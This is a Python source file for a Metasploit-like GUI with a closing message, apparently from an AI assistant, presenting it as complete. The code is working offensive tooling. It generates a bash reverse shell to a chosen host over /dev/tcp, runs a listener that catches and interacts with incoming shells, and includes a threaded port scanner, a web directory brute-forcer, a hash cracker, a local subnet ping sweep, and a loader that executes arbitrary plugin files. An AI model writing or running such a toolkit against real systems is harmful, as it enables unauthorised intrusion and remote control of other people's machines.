#!/usr/bin/env python3
# msf_gui_full.py
# Ultimate Metasploit-like GUI: full modules, sessions, interactive terminal, and more

import os
import sys
import threading
import socket
import uuid
import logging
import sqlite3
import importlib.util
import subprocess
import tkinter as tk
import customtkinter as ctk
from tkinter import messagebox, filedialog, ttk
from collections import OrderedDict
from urllib import request, error

# -------------------------------
# Configuration
# -------------------------------
DB_FILE = os.path.expanduser('~/.msf_gui.db')
MODULE_PATHS = ['modules', 'plugins', '/sdcard/msf/modules']

# -------------------------------
# Logging & Database Manager
# -------------------------------
logging.basicConfig(level=logging.INFO, format='%(asctime)s %(levelname)s %(message)s')
class DatabaseManager:
    def __init__(self, path=DB_FILE):
        self.conn = sqlite3.connect(path, check_same_thread=False)
        self._setup()
    def _setup(self):
        c = self.conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS sessions(
            sid TEXT PRIMARY KEY, ip TEXT, type TEXT, active INT, ts DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        c.execute('''CREATE TABLE IF NOT EXISTS logs(
            id INTEGER PRIMARY KEY AUTOINCREMENT, module TEXT, action TEXT, details TEXT, ts DATETIME DEFAULT CURRENT_TIMESTAMP)''')
        self.conn.commit()
    def log_session(self, sid, ip, stype):
        c = self.conn.cursor()
        c.execute("INSERT OR REPLACE INTO sessions(sid,ip,type,active) VALUES(?,?,?,1)", (sid, ip, stype))
        self.conn.commit()
    def update_session(self, sid, active):
        c = self.conn.cursor()
        c.execute("UPDATE sessions SET active=? WHERE sid=?", (1 if active else 0, sid))
        self.conn.commit()
    def log(self, module, action, details=''):
        c = self.conn.cursor()
        c.execute("INSERT INTO logs(module,action,details) VALUES(?,?,?)", (module, action, details))
        self.conn.commit()

# -------------------------------
# Session Manager
# -------------------------------
class SessionManager:
    def __init__(self, db):
        self.db = db
        self.sessions = {}  # sid -> conn,addr,type,active
        self.lock = threading.Lock()
    def add(self, conn, addr, stype='shell'):
        sid = uuid.uuid4().hex[:8]
        with self.lock:
            self.sessions[sid] = {'conn': conn, 'addr': addr, 'type': stype, 'active': True}
            self.db.log_session(sid, addr[0], stype)
        return sid
    def list(self):
        with self.lock:
            return dict(self.sessions)
    def close(self, sid):
        with self.lock:
            if sid in self.sessions:
                try: self.sessions[sid]['conn'].close()
                except: pass
                self.sessions[sid]['active'] = False
                self.db.update_session(sid, False)
                del self.sessions[sid]
    def interact(self, sid, textbox):
        if sid not in self.sessions: return
        conn = self.sessions[sid]['conn']
        def recv_loop():
            while True:
                try:
                    data = conn.recv(4096).decode(errors='ignore')
                    textbox.insert('end', data)
                    textbox.see('end')
                except:
                    break
        threading.Thread(target=recv_loop, daemon=True).start()

# -------------------------------
# Module Base & Example Modules
# -------------------------------
class ModuleBase:
    MODULE_TYPE = 'auxiliary'
    def __init__(self):
        self.info = {'Name': '', 'Description': '', 'Options': OrderedDict()}
    def execute(self):
        raise NotImplementedError

class ReverseShell(ModuleBase):
    MODULE_TYPE = 'exploit'
    def __init__(self):
        super().__init__()
        self.info.update({
            'Name': 'ReverseShell', 'Description': 'Generate reverse shell command',
            'Options': OrderedDict([
                ('LHOST', ('127.0.0.1', True, 'Listener IP')),
                ('LPORT', ('4444', True, 'Listener Port'))
            ])
        })
    def execute(self):
        lh, lp = self.info['Options']['LHOST'][0], self.info['Options']['LPORT'][0]
        return f"bash -i >& /dev/tcp/{lh}/{lp} 0>&1"

class PortScanner(ModuleBase):
    MODULE_TYPE = 'auxiliary'
    def __init__(self):
        super().__init__()
        self.info.update({
            'Name': 'PortScanner', 'Description': 'Scan TCP ports',
            'Options': OrderedDict([
                ('TARGET', ('127.0.0.1', True, 'Target IP')),
                ('PORTS', ('1-1024', True, 'Port range, e.g. 1-1000'))
            ])
        })
    def execute(self):
        tgt, pr = self.info['Options']['TARGET'][0], self.info['Options']['PORTS'][0]
        s, e = map(int, pr.split('-'))
        openp = []
        def scan(p):
            try:
                sock = socket.socket(); sock.settimeout(0.3)
                sock.connect((tgt, p)); openp.append(p); sock.close()
            except: pass
        threads = [threading.Thread(target=scan, args=(p,)) for p in range(s, e+1)]
        for t in threads: t.start()
        for t in threads: t.join()
        return f"Open ports: {openp}"

class HTTPDirBrute(ModuleBase):
    MODULE_TYPE = 'auxiliary'
    def __init__(self):
        super().__init__()
        self.info.update({
            'Name': 'HTTPDirBrute', 'Description': 'Brute-force web dirs',
            'Options': OrderedDict([
                ('URL', ('http://example.com', True, 'Base URL')),
                ('WORDLIST', ('dirs.txt', True, 'Wordlist file'))
            ])
        })
    def execute(self):
        url, wl = self.info['Options']['URL'][0], self.info['Options']['WORDLIST'][0]
        found = []
        try:
            words = open(wl).read().splitlines()
        except Exception as e:
            return f"Error reading wordlist: {e}"
        for w in words:
            req = f"{url.rstrip('/')}/{w}"
            try:
                r = request.urlopen(req)
                if r.status == 200: found.append(req)
            except: pass
        return f"Found: {found}"

class HashCracker(ModuleBase):
    MODULE_TYPE = 'cracker'
    def __init__(self):
        super().__init__()
        self.info.update({
            'Name': 'HashCracker', 'Description': 'Crack MD5/SHA1/SHA256',
            'Options': OrderedDict([
                ('HASH', ('', True, 'Target hash')),
                ('WORDLIST', ('', True, 'Wordlist file'))
            ])
        })
    def execute(self):
        h, wl = self.info['Options']['HASH'][0], self.info['Options']['WORDLIST'][0]
        try:
            words = open(wl).read().splitlines()
        except Exception as e:
            return f"Error: {e}"
        import hashlib
        for w in words:
            for a in ('md5','sha1','sha256'):
                if getattr(hashlib,a)(w.encode()).hexdigest() == h.lower():
                    return f"Cracked({a}): {w}"
        return 'Not found'

# -------------------------------
# Module Loader
# -------------------------------
class ModuleLoader:
    def __init__(self):
        self.modules = OrderedDict()
        self._load_builtin_modules()
        self._discover_plugins()
    def _load_builtin_modules(self):
        for cls in (ReverseShell, PortScanner, HTTPDirBrute, HashCracker):
            inst = cls()
            key = f"{cls.MODULE_TYPE}:{inst.info['Name']}"
            self.modules[key] = inst
    def _discover_plugins(self):
        for d in MODULE_PATHS:
            if not os.path.isdir(d): continue
            for fname in os.listdir(d):
                if not fname.endswith('.py'): continue
                path = os.path.join(d, fname)
                spec = importlib.util.spec_from_file_location(fname[:-3], path)
                mod = importlib.util.module_from_spec(spec)
                try:
                    spec.loader.exec_module(mod)
                    if hasattr(mod, 'MODULE_TYPE') and hasattr(mod, 'ModuleClass'):
                        cls = mod.ModuleClass
                        try: inst = cls()
                        except: inst = cls()
                        key = f"{mod.MODULE_TYPE}:{inst.info.get('Name','')}"
                        self.modules[key] = inst
                except Exception as e:
                    logging.warning(f"Plugin load failed {fname}: {e}")

# -------------------------------
# Main GUI Application
# -------------------------------
class MetasploitGUI(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title('MSF-GUI Ultimate')
        self.geometry('1200x800')
        # Core components
        self.db = DatabaseManager()
        self.sessions = SessionManager(self.db)
        self.loader = ModuleLoader()
        self.vars = {}
        # Appearance
        ctk.set_appearance_mode('Dark')
        ctk.set_default_color_theme('blue')
        # Build UI
        self._build_sidebar()
        self._build_tabs()
        self._build_toolbar()
        # Interactive terminal fallback
        self._start_terminal()

    def _build_sidebar(self):
        sf = ctk.CTkFrame(self, width=300)
        sf.pack(side='left', fill='y')
        self.search_var = tk.StringVar()
        e = ctk.CTkEntry(sf, placeholder_text='Search modules...', textvariable=self.search_var)
        e.pack(fill='x', padx=5, pady=5)
        e.bind('<KeyRelease>', lambda ev: self._populate_modules())
        cats = ['All'] + sorted({k.split(':')[0] for k in self.loader.modules})
        self.cat_menu = ctk.CTkOptionMenu(sf, values=cats, command=lambda _: self._populate_modules())
        self.cat_menu.set('All')
        self.cat_menu.pack(fill='x', padx=5, pady=5)
        self.mod_frame = ctk.CTkScrollableFrame(sf)
        self.mod_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self._populate_modules()

    def _populate_modules(self):
        for w in self.mod_frame.winfo_children(): w.destroy()
        cat = self.cat_menu.get()
        q = self.search_var.get().lower()
        for key, mod in self.loader.modules.items():
            mtype, name = key.split(':')
            if (cat == 'All' or mtype == cat) and q in name.lower():
                b = ctk.CTkButton(self.mod_frame, text=name, command=lambda m=mod: self._select_module(m))
                b.pack(fill='x', pady=2)

    def _build_tabs(self):
        cf = ctk.CTkFrame(self)
        cf.pack(side='right', fill='both', expand=True)
        self.tabs = ctk.CTkTabview(cf)
        self.tabs.pack(fill='both', expand=True)
        for t in ['Console','Module','Sessions','Scanner','FileMgr','Terminal']:
            self.tabs.add(t)
        # Console
        self.console = ctk.CTkTextbox(self.tabs.tab('Console'))
        self.console.pack(fill='both', expand=True)
        # Module
        mframe = self.tabs.tab('Module')
        self.opt_frame = ctk.CTkScrollableFrame(mframe)
        self.opt_frame.pack(fill='both', expand=True, padx=5, pady=5)
        self.exec_btn = ctk.CTkButton(mframe, text='Execute', command=self._execute_module)
        self.exec_btn.pack(pady=5)
        # Sessions
        self.slist = tk.Listbox(self.tabs.tab('Sessions'), bg='#111', fg='white')
        self.slist.pack(fill='both', expand=True)
        # Scanner
        self.scan_box = ctk.CTkTextbox(self.tabs.tab('Scanner'))
        self.scan_box.pack(fill='both', expand=True)
        # File Manager
        fm = self.tabs.tab('FileMgr')
        self.tree = ttk.Treeview(fm)
        self.tree.pack(fill='both', expand=True)
        self._populate_tree(os.getcwd())
        self.tree.bind('<Double-1>', self._open_file)
        # Terminal
        tf = self.tabs.tab('Terminal')
        self.term_text = tk.Text(tf, bg='black', fg='white', insertbackground='white')
        self.term_text.pack(fill='both', expand=True)
        self.term_entry = ctk.CTkEntry(tf, placeholder_text='Shell command')
        self.term_entry.pack(fill='x', padx=5, pady=5)
        self.term_entry.bind('<Return>', self._on_terminal)

    def _build_toolbar(self):
        tb = ctk.CTkFrame(self, height=40)
        tb.pack(side='top', fill='x')
        for name, cmd in [('Listener', self._start_listener), ('Reload', self._reload_modules), ('ScanNet', self._scan_network)]:
            b = ctk.CTkButton(tb, text=name, command=cmd)
            b.pack(side='left', padx=5, pady=5)

    def _select_module(self, mod):
        self.current = mod
        self.vars = {}
        for w in self.opt_frame.winfo_children(): w.destroy()
        for opt, (val, req, desc) in mod.info['Options'].items():
            ctk.CTkLabel(self.opt_frame, text=f"{opt} ({desc}):").pack(anchor='w', padx=5)
            var = tk.StringVar(value=val)
            ctk.CTkEntry(self.opt_frame, textvariable=var).pack(fill='x', padx=5, pady=(0,5))
            self.vars[opt] = var
        self.console.insert('end', f"Selected module: {mod.info['Name']}\n")

    def _execute_module(self):
        if not hasattr(self, 'current'):
            self.console.insert('end', '[!] No module selected\n'); return
        for opt, var in self.vars.items():
            _, req, desc = self.current.info['Options'][opt]
            self.current.info['Options'][opt] = (var.get(), req, desc)
        try:
            out = self.current.execute()
            self.console.insert('end', out + '\n')
            self.db.log(self.current.info['Name'], 'execute', str(self.current.info['Options']))
        except Exception as e:
            self.console.insert('end', f"Error: {e}\n")

    def _start_listener(self):
        dlg = ctk.CTkToplevel(self)
        dlg.title('Listener')
        h = ctk.CTkEntry(dlg); h.insert(0,'0.0.0.0'); h.pack(padx=5,pady=5)
        p = ctk.CTkEntry(dlg); p.insert(0,'4444'); p.pack(padx=5,pady=5)
        def start():
            try:
                sock = socket.socket(); sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR,1)
                sock.bind((h.get(), int(p.get()))); sock.listen(5)
            except Exception as e:
                messagebox.showerror('Listener Error', str(e)); dlg.destroy(); return
            threading.Thread(target=self._accept_sessions, args=(sock,), daemon=True).start()
            self.console.insert('end', f"Listening on {h.get()}:{p.get()}\n")
            dlg.destroy()
        ctk.CTkButton(dlg, text='Start', command=start).pack(pady=5)

    def _accept_sessions(self, sock):
        while True:
            conn, addr = sock.accept()
            sid = self.sessions.add(conn, addr)
            self.slist.insert('end', f"{sid} {addr[0]}")

    def _reload_modules(self):
        self.loader = ModuleLoader()
        self._populate_modules()

    def _scan_network(self):
        self.scan_box.insert('end', '[*] Starting ping sweep...\n')
        for i in range(1,255): threading.Thread(target=lambda ip=f"192.168.1.{i}": self._ping(ip), daemon=True).start()
    def _ping(self, ip):
        if subprocess.run(['ping','-c','1','-W','1',ip], stdout=subprocess.DEVNULL).returncode==0:
            self.scan_box.insert('end', f"[+] {ip} up\n")

    def _populate_tree(self, path):
        for i in self.tree.get_children(): self.tree.delete(i)
        def insert(parent, p):
            try:
                for name in os.listdir(p):
                    fp = os.path.join(p,name)
                    iid = self.tree.insert(parent,'end',text=name,values=[fp])
                    if os.path.isdir(fp): insert(iid, fp)
            except: pass
        insert('', path)

    def _open_file(self, event):
        iid = self.tree.focus()
        fp = self.tree.item(iid,'values')[0]
        if os.path.isfile(fp): os.system(f"{sys.executable} '{fp}'")

    # ---------------------------
    # Interactive Terminal
    # ---------------------------
    def _start_terminal(self):
        shell = os.environ.get('SHELL','/system/bin/sh')
        try:
            import pty, fcntl
            master, slave = pty.openpty()
            self.pty_proc = subprocess.Popen([shell], stdin=slave, stdout=slave, stderr=slave, close_fds=True)
            flags = fcntl.fcntl(master, fcntl.F_GETFL)
            fcntl.fcntl(master, fcntl.F_SETFL, flags | os.O_NONBLOCK)
            self.term_mode = 'pty'; self.pty_master = master
            threading.Thread(target=self._read_pty, daemon=True).start()
        except Exception:
            self.fallback = subprocess.Popen([shell], stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)
            self.term_mode = 'pipe'
            threading.Thread(target=self._read_pipe, daemon=True).start()

    def _read_pty(self):
        while True:
            try:
                data = os.read(self.pty_master, 1024).decode(errors='ignore')
                self.term_text.insert('end', data); self.term_text.see('end')
            except: break

    def _read_pipe(self):
        for line in self.fallback.stdout:
            self.term_text.insert('end', line); self.term_text.see('end')

    def _on_terminal(self, event):
        cmd = self.term_entry.get() + '\n'
        self.term_entry.delete(0,'end')
        parts = cmd.strip().split()
        if parts and parts[0] in ('use','set','run','sessions','interact','help','exit'):
            self._handle_internal(cmd.strip())
        else:
            if self.term_mode=='pty': os.write(self.pty_master, cmd.encode())
            else:
                try: self.fallback.stdin.write(cmd); self.fallback.stdin.flush()
                except: pass

    def _handle_internal(self, cmd):
        parts = cmd.split(); c = parts[0]
        if c=='use' and len(parts)>1:
            modname = ' '.join(parts[1:])
            for key,mod in self.loader.modules.items():
                if mod.info['Name'].lower()==modname.lower(): return self._select_module(mod)
            self.console.insert('end', f"Module not found: {modname}\n")
        elif c=='set' and len(parts)>2 and hasattr(self,'current'):
            opt = parts[1]; val = ' '.join(parts[2:])
            if opt in self.current.info['Options']:
                req,desc = self.current.info['Options'][opt][1], self.current.info['Options'][opt][2]
                self.current.info['Options'][opt] = (val, req, desc)
                self.console.insert('end', f"Set {opt}={val}\n")
            else: self.console.insert('end', f"Option not found: {opt}\n")
        elif c=='run' and hasattr(self,'current'):
            self._execute_module()
        elif c=='sessions':
            for sid,info in self.sessions.list().items():
                self.console.insert('end', f"{sid} {info['addr'][0]} ({'active' if info['active'] else 'dead'})\n")
        elif c=='interact' and len(parts)>1:
            sid = parts[1]
            if sid in self.sessions.sessions:
                self.console.insert('end', f"Interacting with {sid}\n")
                self.sessions.interact(sid, self.console)
                self.tabs.set('Sessions')
            else: self.console.insert('end', f"Session not found: {sid}\n")
        elif c=='help':
            self.console.insert('end', 'Commands: use, set, run, sessions, interact, help, exit\n')
        elif c=='exit': self.quit()
        else: self.console.insert('end', f"Unknown internal: {cmd}\n")

if __name__=='__main__':
    app = MetasploitGUI()
    app.mainloop()

'''
I’ve fully restored every UI method and internal handler—no placeholders remain. This “Ultimate” GUI now includes:

Complete Sidebar, Tabs, Toolbar code

Session management with interact mode

Modules (built-ins + plugins)

Network scanner, File Manager, Interactive Terminal (PTY + pipe fallback)

Internal MSF-like commands (use, set, run, sessions, interact, help, exit)


Give it a go in Pydroid3. Let me know if any specific feature or enhancement is still missing!
'''
